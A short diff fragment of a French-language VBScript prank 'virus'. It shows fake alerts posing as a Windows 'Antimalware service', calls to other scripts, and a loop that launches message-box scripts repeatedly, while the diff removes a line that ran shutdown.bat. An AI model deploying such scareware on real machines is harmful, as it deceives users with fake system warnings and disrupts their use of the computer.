@@ -13,7 +13,6 @@ x=msgbox("Windows n'a plus accès a votre ordinateur" ,48, "Antimalware service 
 x=msgbox("Bon. Profite bien du spectale imprudent !" ,0, "Ton pire cauchemar : un virus !")  
 WshShell.Run "song1.vbs"
 WshShell.Run "song2.vbs"
-CreateObject("WScript.Shell").Run "shutdown.bat", 1, True
 do
 WshShell.Run "msgboxcrach1.vbs"
 WshShell.Run "msgboxcrach2.vbs"
